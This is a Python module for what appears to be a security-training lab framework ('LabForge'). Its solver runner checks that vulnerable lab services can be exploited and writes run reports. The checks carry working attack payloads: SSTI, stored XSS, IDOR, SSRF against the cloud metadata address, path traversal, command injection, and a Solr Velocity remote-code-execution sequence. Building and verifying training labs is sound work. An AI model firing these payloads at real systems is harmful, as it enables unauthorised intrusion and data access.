from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path
from typing import Literal
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

from pydantic import BaseModel, ConfigDict, Field

from .io import dump_yaml, write_text


SolverStepStatus = Literal["planned", "passed", "warning", "failed", "skipped"]


class SolverRunnerModel(BaseModel):
    model_config = ConfigDict(extra="allow")


class SolverRunStep(SolverRunnerModel):
    order: int
    step_id: str
    action_type: str
    service: str = ""
    plugin: str = ""
    status: SolverStepStatus
    command: str = ""
    target: str = ""
    evidence: list[str] = Field(default_factory=list)
    message: str = ""
    stdout: str = ""
    stderr: str = ""


class SolverRunReport(SolverRunnerModel):
    lab_id: str
    title: str
    mode: Literal["dry-run", "execute"]
    status: Literal["planned", "passed", "warning", "failed"]
    solver_plan: str
    access_manifest: str = ""
    endpoint_manifest: str = ""
    steps: list[SolverRunStep] = Field(default_factory=list)
    browser_targets: list[str] = Field(default_factory=list)
    terminal_targets: list[str] = Field(default_factory=list)
    final_targets: list[str] = Field(default_factory=list)
    service_targets: dict[str, str] = Field(default_factory=dict)
    next_actions: list[str] = Field(default_factory=list)


def run_solver_plan(
    solver_plan: Path,
    out: Path,
    *,
    access_manifest: Path | None = None,
    endpoint_manifest: Path | None = None,
    execute: bool = False,
    timeout_seconds: int = 5,
) -> SolverRunReport:
    solver_plan = solver_plan.resolve()
    out.mkdir(parents=True, exist_ok=True)
    plan = load_json_object(solver_plan)
    access = load_json_object(access_manifest.resolve()) if access_manifest else {}
    endpoints = load_json_object(endpoint_manifest.resolve()) if endpoint_manifest else {}
    browser_targets = browser_targets_from(plan, access)
    terminal_targets = terminal_targets_from(plan, access)
    final_targets = final_targets_from(plan, access)
    service_targets = service_targets_from(access, endpoints)
    steps: list[SolverRunStep] = []
    for raw_step in plan.get("steps", []) or []:
        if isinstance(raw_step, dict):
            steps.append(
                run_solver_step(
                    raw_step,
                    browser_targets,
                    terminal_targets,
                    final_targets,
                    service_targets,
                    execute=execute,
                    timeout_seconds=timeout_seconds,
                )
            )
    mode: Literal["dry-run", "execute"] = "execute" if execute else "dry-run"
    status = aggregate_solver_status(steps, execute=execute)
    report = SolverRunReport(
        lab_id=str(plan.get("lab_id", "")),
        title=str(plan.get("title", "")),
        mode=mode,
        status=status,
        solver_plan=str(solver_plan),
        access_manifest=str(access_manifest.resolve()) if access_manifest else "",
        endpoint_manifest=str(endpoint_manifest.resolve()) if endpoint_manifest else "",
        steps=steps,
        browser_targets=browser_targets,
        terminal_targets=terminal_targets,
        final_targets=final_targets,
        service_targets=service_targets,
        next_actions=solver_next_actions(plan, browser_targets, terminal_targets, final_targets, execute=execute),
    )
    write_text(out / "solver-run.yaml", dump_yaml(report.model_dump()))
    write_text(out / "solver-run.json", report.model_dump_json(indent=2))
    write_text(out / "solver-run.md", render_solver_run_markdown(report))
    return report


def load_json_object(path: Path) -> dict:
    if not path.exists():
        raise FileNotFoundError(path)
    data = json.loads(path.read_text(encoding="utf-8"))
    if not isinstance(data, dict):
        raise ValueError(f"JSON document is not an object: {path}")
    return data


def browser_targets_from(plan: dict, access: dict) -> list[str]:
    targets: list[str] = []
    for value in [plan.get("learner_start"), *(item.get("connect") for item in access.get("learner_entrypoints", []) or [] if isinstance(item, dict))]:
        target = str(value or "")
        if target.startswith("http") and target not in targets:
            targets.append(target)
    return targets


def terminal_targets_from(plan: dict, access: dict) -> list[str]:
    targets: list[str] = []
    for value in [plan.get("attacker_shell"), *(item.get("connect") for item in access.get("attacker_entrypoints", []) or [] if isinstance(item, dict))]:
        target = str(value or "")
        if target.startswith("ssh ") and target not in targets:
            targets.append(target)
    return targets


def final_targets_from(plan: dict, access: dict) -> list[str]:
    targets: list[str] = []
    for value in [plan.get("final_submission"), *(item.get("connect") for item in access.get("final_submission_endpoints", []) or [] if isinstance(item, dict))]:
        target = str(value or "")
        if target.startswith("http") and target not in targets:
            targets.append(target)
    return targets


def service_targets_from(access: dict, endpoints: dict) -> dict[str, str]:
    targets: dict[str, str] = {}
    collections = (
        access.get("learner_entrypoints", []) or [],
        access.get("attacker_entrypoints", []) or [],
        access.get("final_submission_endpoints", []) or [],
        endpoints.get("published_endpoints", []) or [],
    )
    for collection in collections:
        if not isinstance(collection, list):
            continue
        for item in collection:
            if not isinstance(item, dict):
                continue
            if str(item.get("protocol", "http")).lower() != "http":
                continue
            service = str(item.get("service", "")).strip()
            url = str(item.get("url") or item.get("connect") or "").strip()
            if service and url.startswith("http"):
                targets.setdefault(service, url.rstrip("/"))
    return targets


def run_solver_step(
    raw_step: dict,
    browser_targets: list[str],
    terminal_targets: list[str],
    final_targets: list[str],
    service_targets: dict[str, str],
    *,
    execute: bool,
    timeout_seconds: int,
) -> SolverRunStep:
    action_type = str(raw_step.get("action_type", "verification"))
    order = int(raw_step.get("order") or 0)
    step_id = str(raw_step.get("step_id", ""))
    service = str(raw_step.get("service", ""))
    plugin = str(raw_step.get("plugin", ""))
    evidence = [str(item) for item in raw_step.get("evidence", []) or []]
    if not execute:
        return SolverRunStep(
            order=order,
            step_id=step_id,
            action_type=action_type,
            service=service,
            plugin=plugin,
            status="planned",
            target=planned_target(action_type, browser_targets, terminal_targets, final_targets),
            evidence=evidence,
            message="dry-run",
        )
    if action_type == "access":
        return run_access_solver_step(order, step_id, browser_targets, terminal_targets, evidence, timeout_seconds=timeout_seconds)
    if action_type == "final-submission":
        target = str(raw_step.get("evidence", [""])[0] if raw_step.get("evidence") else "")
        if "http" in target:
            target = target.split("http", maxsplit=1)[1]
            target = "http" + target
        return run_http_probe(order, step_id, action_type, target or planned_target(action_type, browser_targets, terminal_targets, final_targets), service, plugin, evidence, timeout_seconds=timeout_seconds)
    if action_type == "vulnerability-behavior":
        return run_plugin_http_sequence(order, step_id, service, plugin, service_targets.get(service, ""), evidence, timeout_seconds=timeout_seconds)
    return SolverRunStep(
        order=order,
        step_id=step_id,
        action_type=action_type,
        service=service,
        plugin=plugin,
        status="passed" if evidence else "planned",
        evidence=evidence,
        message="non-interactive solver checkpoint",
    )


def run_access_solver_step(order: int, step_id: str, browser_targets: list[str], terminal_targets: list[str], evidence: list[str], *, timeout_seconds: int) -> SolverRunStep:
    if browser_targets:
        return run_http_probe(order, step_id, "access", browser_targets[0], "", "", evidence, timeout_seconds=timeout_seconds)
    if terminal_targets:
        return run_ssh_probe(order, step_id, terminal_targets[0], evidence, timeout_seconds=timeout_seconds)
    return SolverRunStep(order=order, step_id=step_id, action_type="access", status="failed", evidence=evidence, message="no browser or terminal target")


def run_http_probe(order: int, step_id: str, action_type: str, target: str, service: str, plugin: str, evidence: list[str], *, timeout_seconds: int) -> SolverRunStep:
    if not target.startswith("http"):
        return SolverRunStep(order=order, step_id=step_id, action_type=action_type, service=service, plugin=plugin, status="skipped", target=target, evidence=evidence, message="no HTTP target")
    try:
        request = Request(target, headers={"User-Agent": "LabForge-SolverRunner/1.0"})
        with urlopen(request, timeout=timeout_seconds) as response:
            body = response.read(256).decode("utf-8", "replace")
            ok = 200 <= int(response.status) < 500
            return SolverRunStep(
                order=order,
                step_id=step_id,
                action_type=action_type,
                service=service,
                plugin=plugin,
                status="passed" if ok else "failed",
                target=target,
                evidence=evidence,
                stdout=body,
                message=f"http_status={response.status}",
            )
    except URLError as exc:
        return SolverRunStep(order=order, step_id=step_id, action_type=action_type, service=service, plugin=plugin, status="failed", target=target, evidence=evidence, message=str(exc))


def run_plugin_http_sequence(
    order: int,
    step_id: str,
    service: str,
    plugin: str,
    base_url: str,
    evidence: list[str],
    *,
    timeout_seconds: int,
) -> SolverRunStep:
    if not base_url:
        return SolverRunStep(
            order=order,
            step_id=step_id,
            action_type="vulnerability-behavior",
            service=service,
            plugin=plugin,
            status="skipped",
            evidence=evidence,
            message="service is not published as an HTTP endpoint",
        )
    discovery_status, discovery_data, _ = http_json("GET", f"{base_url}/operations/reference", None, timeout_seconds)
    discovery_note = discovery_message(discovery_status, discovery_data)
    landing_ok, landing_note = plugin_landing_probe(base_url, plugin, timeout_seconds)
    context_note = f"{discovery_note}; {landing_note}"
    if plugin == "ssti-preview":
        status, data, body, route = http_json_first(
            "POST",
            base_url,
            ["/operations/preview", "/labforge/scaffold/ssti-preview"],
            {"body": "{{ 7*7 }}"},
            timeout_seconds,
        )
        ok = landing_ok and status == 200 and str(data.get("preview", "")) == "49"
        return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; route={route}; http_status={status}; preview={data.get('preview', body[:64])}")
    if plugin == "stored-xss-review":
        created_status, created, _, create_route = http_json_first(
            "POST",
            base_url,
            ["/operations/review-items", "/labforge/scaffold/review-items"],
            {"title": "Solver review", "body": "<b>stored</b>"},
            timeout_seconds,
        )
        item_id = str(created.get("id", ""))
        opened_status, _, opened_body, open_route = (
            http_json_first("GET", base_url, [f"/operations/reviewer/items/{item_id}", f"/labforge/scaffold/reviewer/items/{item_id}"], None, timeout_seconds)
            if item_id
            else (0, {}, "", "")
        )
        ok = landing_ok and created_status == 201 and opened_status == 200 and "stored" in opened_body
        return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; create_route={create_route}; open_route={open_route}; created={created_status}; opened={opened_status}; item_id={item_id or '-'}")
    if plugin == "idor-object-access":
        status, data, _, route = http_json_first(
            "GET",
            base_url,
            ["/api/business-objects/obj-9001?owner=learner", "/labforge/scaffold/objects/obj-9001?owner=learner"],
            None,
            timeout_seconds,
        )
        ok = landing_ok and status == 200 and "LABFORGE_SYNTHETIC_OBJECT" in str(data.get("content", ""))
        return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; route={route}; http_status={status}")
    if plugin == "ssrf-internal-fetch":
        status, data, _, route = http_json_first(
            "GET",
            base_url,
            ["/operations/fetch?url=http://169.254.169.254/latest", "/labforge/scaffold/fetch?url=http://169.254.169.254/latest"],
            None,
            timeout_seconds,
        )
        ok = landing_ok and status == 400 and data.get("allowed") is False
        return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; route={route}; blocked_fetch_status={status}; allowed={data.get('allowed')}")
    if plugin == "path-traversal-download":
        public_status, _, _, public_route = http_json_first(
            "GET",
            base_url,
            ["/documents/download?name=welcome.txt", "/labforge/scaffold/documents/download?name=welcome.txt"],
            None,
            timeout_seconds,
        )
        traversed_status, _, traversed_body, traversed_route = http_json_first(
            "GET",
            base_url,
            ["/documents/download?name=../restricted/audit-export.txt", "/labforge/scaffold/documents/download?name=../restricted/audit-export.txt"],
            None,
            timeout_seconds,
        )
        ok = landing_ok and public_status == 200 and traversed_status == 200 and "LABFORGE_SYNTHETIC_RESTRICTED_DOCUMENT" in traversed_body
        return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; public_route={public_route}; traversed_route={traversed_route}; public={public_status}; traversed={traversed_status}")
    if plugin == "unsafe-file-upload":
        uploaded_status, uploaded, _ = http_multipart_upload(
            f"{base_url}/attachments",
            field_name="file",
            filename="case-note.txt",
            content=b"labforge upload smoke",
            timeout_seconds=timeout_seconds,
        )
        upload_route = "/attachments"
        if uploaded_status == 404:
            uploaded_status, uploaded, _ = http_multipart_upload(
                f"{base_url}/labforge/scaffold/uploads",
                field_name="file",
                filename="case-note.txt",
                content=b"labforge upload smoke",
                timeout_seconds=timeout_seconds,
            )
            upload_route = "/labforge/scaffold/uploads"
        filename = str(uploaded.get("filename", ""))
        retrieved_status, _, retrieved_body, retrieve_route = (
            http_json_first("GET", base_url, [f"/attachments/{filename}", f"/labforge/scaffold/uploads/{filename}"], None, timeout_seconds)
            if filename
            else (0, {}, "", "")
        )
        ok = landing_ok and uploaded_status == 201 and retrieved_status == 200 and "labforge upload smoke" in retrieved_body
        return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; upload_route={upload_route}; retrieve_route={retrieve_route}; uploaded={uploaded_status}; retrieved={retrieved_status}; filename={filename or '-'}")
    if plugin == "diagnostic-command-injection":
        status, data, _, route = http_json_first(
            "POST",
            base_url,
            ["/operations/diagnostics/run", "/labforge/scaffold/diagnostics/run"],
            {"command": "id"},
            timeout_seconds,
        )
        ok = landing_ok and status == 200 and data.get("accepted") is True
        return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; route={route}; http_status={status}; accepted={data.get('accepted')}")
    if plugin == "solr-velocity-rce":
        system_status, _, _, system_route = http_json_first(
            "GET",
            base_url,
            ["/solr/ops-core/admin/info/system", "/solr/admin/info/system", "/labforge/scaffold/solr/admin/info/system"],
            None,
            timeout_seconds,
        )
        config_status, _, _, config_route = http_json_first(
            "POST",
            base_url,
            ["/solr/ops-core/config", "/labforge/scaffold/solr/config"],
            {
                "update-queryresponsewriter": {
                    "name": "velocity",
                    "class": "solr.VelocityResponseWriter",
                    "params.resource.loader.enabled": "true",
                }
            },
            timeout_seconds,
        )
        select_status, _, select_body, select_route = http_json_first(
            "GET",
            base_url,
            [
                "/solr/ops-core/select?q=*:*&wt=velocity&v.template=custom&v.template.custom=labforge_cmd%3Did",
                "/labforge/scaffold/solr/select?q=*:*&wt=velocity&v.template=custom&v.template.custom=labforge_cmd%3Did",
            ],
            None,
            timeout_seconds,
        )
        ok = landing_ok and system_status == 200 and config_status == 200 and select_status == 200 and "uid=8983(solr)" in select_body
        return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; system_route={system_route}; config_route={config_route}; select_route={select_route}; system={system_status}; config={config_status}; select={select_status}")
    if plugin == "credential-exposure":
        config_status, config, _, config_route = http_json_first(
            "GET",
            base_url,
            ["/api/config", "/labforge/scaffold/config"],
            None,
            timeout_seconds,
        )
        log_status, _, log_body, log_route = http_json_first(
            "GET",
            base_url,
            ["/api/config/startup-log", "/labforge/scaffold/config/startup-log"],
            None,
            timeout_seconds,
        )
        ok = (
            landing_ok
            and config_status == 200
            and log_status == 200
            and config.get("secret_value") == "redacted"
            and "vault-cache export" in log_body
        )
        return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; config_route={config_route}; log_route={log_route}; config={config_status}; log={log_status}; secret_value={config.get('secret_value', '-')}")
    if plugin == "build-pipeline-abuse":
        payload = {"repo": "smoke/product-agent", "ref": "refs/heads/release/smoke", "channel": "smoke", "support_patch_ref": "lab://smoke.patch"}
        status, data, _, route = http_json_first(
            "POST",
            base_url,
            ["/api/build/jobs", "/labforge/scaffold/build/jobs"],
            payload,
            timeout_seconds,
        )
        ok = landing_ok and status == 201 and data.get("status") == "built" and "canonical_manifest" in data
        return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; route={route}; http_status={status}; job_id={data.get('job_id', '-')}")
    if plugin == "signed-update-publish":
        manifest = {
            "product": "product-agent",
            "channel": "smoke",
            "version": "0.0.0",
            "build_id": "build-smoke",
            "artifact": {"name": "smoke.tar", "sha256": "0" * 64, "url": "http://build-server/smoke.tar", "size_bytes": 1},
        }
        signed_status, signed, _, sign_route = http_json_first("POST", base_url, ["/api/sign", "/labforge/scaffold/sign"], {"canonical_manifest": manifest}, timeout_seconds)
        publish_status, _, _, publish_route = http_json_first("POST", base_url, ["/api/publish", "/labforge/scaffold/publish"], {"channel": "smoke", "signed_manifest": signed.get("signed_manifest")}, timeout_seconds)
        ok = landing_ok and signed_status == 200 and publish_status == 201
        return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; sign_route={sign_route}; publish_route={publish_route}; signed={signed_status}; published={publish_status}")
    if plugin == "customer-update-callback":
        pre_status, _, _, pre_route = http_json_first("GET", base_url, ["/api/customer/export", "/labforge/scaffold/customer/export"], None, timeout_seconds)
        manifest = {"product": "product-agent", "channel": "smoke", "build_id": "build-smoke", "artifact": {}, "signature": "smoke"}
        poll_status, _, _, poll_route = http_json_first("POST", base_url, ["/api/customer/poll", "/labforge/scaffold/customer/poll"], {"manifest": manifest}, timeout_seconds)
        export_status, export, _, export_route = http_json_first("GET", base_url, ["/api/customer/export", "/labforge/scaffold/customer/export"], None, timeout_seconds)
        ok = landing_ok and pre_status == 403 and poll_status == 202 and export_status == 200 and export.get("content") == "LABFORGE_SUPPLY_CHAIN_FINAL_OBJECT"
        return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; pre_route={pre_route}; poll_route={poll_route}; export_route={export_route}; pre={pre_status}; poll={poll_status}; export={export_status}")
    return SolverRunStep(
        order=order,
        step_id=step_id,
        action_type="vulnerability-behavior",
        service=service,
        plugin=plugin,
        status="warning",
        target=base_url,
        evidence=evidence,
        message=f"{discovery_note}; plugin HTTP solver sequence is not implemented",
    )


def plugin_step(order: int, step_id: str, service: str, plugin: str, target: str, evidence: list[str], ok: bool, message: str) -> SolverRunStep:
    if ok:
        state_note = stage_state_message(target)
        if state_note:
            message = f"{message}; {state_note}"
    return SolverRunStep(
        order=order,
        step_id=step_id,
        action_type="vulnerability-behavior",
        service=service,
        plugin=plugin,
        status="passed" if ok else "failed",
        target=target,
        evidence=evidence,
        message=message,
    )


def plugin_landing_probe(base_url: str, plugin: str, timeout_seconds: int) -> tuple[bool, str]:
    specs: dict[str, tuple[list[str], list[str]]] = {
        "ssti-preview": (["/operations/preview", "/labforge/scaffold/ssti-preview"], ["Response Preview"]),
        "stored-xss-review": (["/operations/review", "/labforge/scaffold/review"], ["Review Intake"]),
        "idor-object-access": (["/objects", "/api/business-objects", "/labforge/scaffold/objects"], ["Business Object Catalog"]),
        "ssrf-internal-fetch": (["/operations/fetch", "/labforge/scaffold/fetch"], ["Upstream Import Console"]),
        "path-traversal-download": (["/documents", "/labforge/scaffold/documents"], ["Document Library"]),
        "unsafe-file-upload": (["/attachments", "/labforge/scaffold/uploads"], ["Case Attachment Portal"]),
        "diagnostic-command-injection": (["/operations/diagnostics", "/labforge/scaffold/diagnostics"], ["Operations Diagnostics Console"]),
        "solr-velocity-rce": (["/operations/search-admin", "/solr/ops-core/admin/info/system", "/labforge/scaffold/solr/admin/info/system"], ["Search Operations Console"]),
        "credential-exposure": (["/operations/config", "/api/config", "/labforge/scaffold/config"], ["Runtime Configuration"]),
        "build-pipeline-abuse": (["/operations/build", "/api/build/context", "/labforge/scaffold/build/context"], ["Release Build Console"]),
        "signed-update-publish": (["/operations/update-channel", "/api/channels/smoke", "/labforge/scaffold/channels/smoke"], ["Update Channel Console"]),
        "customer-update-callback": (["/operations/customer-agent", "/api/customer/status", "/labforge/scaffold/customer/status"], ["Customer Agent Status"]),
    }
    routes, expected_texts = specs.get(plugin, ([], []))
    if not routes:
        return True, "landing=not-required"
    status, body, route = http_text_first("GET", base_url, routes, timeout_seconds)
    if status == 0:
        return False, "landing=unreachable"
    if status == 404:
        return False, f"landing=missing; landing_route={route}"
    missing = [text for text in expected_texts if text not in body]
    if missing:
        return False, f"landing={status}; landing_route={route}; missing_landing_text={','.join(missing)}"
    return 200 <= status < 400, f"landing={status}; landing_route={route}; landing_texts={len(expected_texts)}"


def stage_state_message(base_url: str) -> str:
    if not base_url.startswith("http"):
        return ""
    status, data, _ = http_json("GET", f"{base_url}/api/state", None, 3)
    if status == 404:
        return "stage_state=not-exposed"
    if status == 0:
        return "stage_state=unreachable"
    if status != 200:
        return f"stage_state={status}"
    acquired = data.get("acquired_evidence", []) if isinstance(data, dict) else []
    stages = data.get("stages", []) if isinstance(data, dict) else []
    unlocked = [
        stage
        for stage in stages
        if isinstance(stage, dict) and str(stage.get("status", "")).lower() == "unlocked"
    ]
    if isinstance(acquired, list) and isinstance(stages, list):
        return f"stage_state=200; acquired_evidence={len(acquired)}; unlocked_stages={len(unlocked)}"
    return "stage_state=200; shape=unexpected"


def discovery_message(status: int, data: dict) -> str:
    items = data.get("items", []) if isinstance(data, dict) else []
    count = len(items) if isinstance(items, list) else 0
    if status == 200:
        return f"discovery=200; discovery_items={count}"
    if status == 0:
        return "discovery=unreachable"
    return f"discovery={status}"


def http_json(method: str, url: str, payload: dict | None, timeout_seconds: int) -> tuple[int, dict, str]:
    data = None
    headers = {"User-Agent": "LabForge-SolverRunner/1.0"}
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    request = Request(url, data=data, headers=headers, method=method)
    try:
        with urlopen(request, timeout=timeout_seconds) as response:
            body = response.read(8192).decode("utf-8", "replace")
            return int(response.status), parse_json_body(body), body
    except HTTPError as exc:
        try:
            body = exc.read().decode("utf-8", "replace")
        finally:
            exc.close()
        return int(exc.code), parse_json_body(body), body
    except URLError as exc:
        return 0, {}, str(exc)
    except OSError as exc:
        return 0, {}, str(exc)


def http_json_first(method: str, base_url: str, routes: list[str], payload: dict | None, timeout_seconds: int) -> tuple[int, dict, str, str]:
    last_status = 0
    last_data: dict = {}
    last_body = ""
    last_route = ""
    for route in routes:
        status, data, body = http_json(method, f"{base_url}{route}", payload, timeout_seconds)
        if status != 404 and status != 0:
            return status, data, body, route
        last_status, last_data, last_body, last_route = status, data, body, route
    return last_status, last_data, last_body, last_route


def http_text_first(method: str, base_url: str, routes: list[str], timeout_seconds: int) -> tuple[int, str, str]:
    last_status = 0
    last_body = ""
    last_route = ""
    for route in routes:
        status, body = http_text(method, f"{base_url}{route}", timeout_seconds)
        if status != 404 and status != 0:
            return status, body, route
        last_status, last_body, last_route = status, body, route
    return last_status, last_body, last_route


def http_text(method: str, url: str, timeout_seconds: int) -> tuple[int, str]:
    request = Request(url, headers={"User-Agent": "LabForge-SolverRunner/1.0"}, method=method)
    try:
        with urlopen(request, timeout=timeout_seconds) as response:
            return int(response.status), response.read(8192).decode("utf-8", "replace")
    except HTTPError as exc:
        try:
            body = exc.read().decode("utf-8", "replace")
        finally:
            exc.close()
        return int(exc.code), body
    except URLError as exc:
        return 0, str(exc)
    except OSError as exc:
        return 0, str(exc)


def http_multipart_upload(url: str, *, field_name: str, filename: str, content: bytes, timeout_seconds: int) -> tuple[int, dict, str]:
    boundary = "----LabForgeSolverBoundary"
    body = b"".join(
        [
            f"--{boundary}\r\n".encode("ascii"),
            f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'.encode("utf-8"),
            b"Content-Type: text/plain\r\n\r\n",
            content,
            b"\r\n",
            f"--{boundary}--\r\n".encode("ascii"),
        ]
    )
    request = Request(
        url,
        data=body,
        headers={
            "User-Agent": "LabForge-SolverRunner/1.0",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
        },
        method="POST",
    )
    try:
        with urlopen(request, timeout=timeout_seconds) as response:
            text = response.read(8192).decode("utf-8", "replace")
            return int(response.status), parse_json_body(text), text
    except HTTPError as exc:
        try:
            text = exc.read().decode("utf-8", "replace")
        finally:
            exc.close()
        return int(exc.code), parse_json_body(text), text
    except URLError as exc:
        return 0, {}, str(exc)
    except OSError as exc:
        return 0, {}, str(exc)


def parse_json_body(body: str) -> dict:
    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        return {}
    return data if isinstance(data, dict) else {}


def run_ssh_probe(order: int, step_id: str, command: str, evidence: list[str], *, timeout_seconds: int) -> SolverRunStep:
    argv = ssh_batch_argv(command)
    if not argv:
        return SolverRunStep(order=order, step_id=step_id, action_type="access", status="skipped", command=command, evidence=evidence, message="unsupported SSH command")
    if not shutil.which(argv[0]):
        return SolverRunStep(order=order, step_id=step_id, action_type="access", status="skipped", command=command, evidence=evidence, message="ssh executable missing")
    try:
        completed = subprocess.run(argv, check=False, capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=timeout_seconds)
    except subprocess.TimeoutExpired:
        return SolverRunStep(order=order, step_id=step_id, action_type="access", status="failed", command=command, evidence=evidence, message=f"ssh timed out after {timeout_seconds}s")
    return SolverRunStep(
        order=order,
        step_id=step_id,
        action_type="access",
        status="passed" if completed.returncode == 0 else "failed",
        command=command,
        evidence=evidence,
        stdout=completed.stdout.strip(),
        stderr=completed.stderr.strip(),
        message=f"exit_code={completed.returncode}",
    )


def ssh_batch_argv(command: str) -> list[str]:
    if not command.startswith("ssh "):
        return []
    parts = command.split()
    if "-o" not in parts:
        parts[1:1] = ["-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5"]
    if "true" not in parts:
        parts.append("true")
    return parts


def planned_target(action_type: str, browser_targets: list[str], terminal_targets: list[str], final_targets: list[str] | None = None) -> str:
    if action_type == "final-submission" and final_targets:
        return final_targets[0]
    if action_type == "access" and browser_targets:
        return browser_targets[0]
    if action_type == "access" and terminal_targets:
        return terminal_targets[0]
    return ""


def aggregate_solver_status(steps: list[SolverRunStep], *, execute: bool) -> Literal["planned", "passed", "warning", "failed"]:
    if not execute:
        return "planned"
    if any(step.status == "failed" for step in steps):
        return "failed"
    if any(step.status in {"warning", "skipped", "planned"} for step in steps):
        return "warning"
    return "passed"


def solver_next_actions(plan: dict, browser_targets: list[str], terminal_targets: list[str], final_targets: list[str], *, execute: bool) -> list[str]:
    actions = []
    if browser_targets:
        actions.append(f"Open learner browser target: {browser_targets[0]}")
    if terminal_targets:
        actions.append(f"Open attacker terminal target: {terminal_targets[0]}")
    if final_targets:
        actions.append(f"Use final submission endpoint when proof is collected: {final_targets[0]}")
    if not execute:
        actions.append("Re-run with --execute after provider startup to probe browser and SSH access.")
    return actions


def render_solver_run_markdown(report: SolverRunReport) -> str:
    lines = [
        f"# Solver Run - {report.title or report.lab_id}",
        "",
        f"- Lab ID: `{report.lab_id}`",
        f"- Mode: `{report.mode}`",
        f"- Status: `{report.status}`",
        f"- Solver plan: `{report.solver_plan}`",
        f"- Access manifest: `{report.access_manifest or '-'}`",
        f"- Endpoint manifest: `{report.endpoint_manifest or '-'}`",
        "",
        "## Steps",
        "",
        "| # | Step | Type | Status | Service | Plugin | Target/Command | Message |",
        "|---|---|---|---|---|---|---|---|",
    ]
    for step in report.steps:
        target = step.target or step.command or "-"
        lines.append(
            f"| {step.order} | `{escape_cell(step.step_id)}` | `{escape_cell(step.action_type)}` | {step.status} | "
            f"`{escape_cell(step.service or '-')}` | `{escape_cell(step.plugin or '-')}` | `{escape_cell(target)}` | {escape_cell(step.message or '-')} |"
        )
    lines.extend(["", "## Next Actions", ""])
    lines.extend(f"- {item}" for item in report.next_actions)
    lines.append("")
    return "\n".join(lines)


def escape_cell(value: str) -> str:
    return str(value).replace("|", "\\|").replace("\n", "<br>")
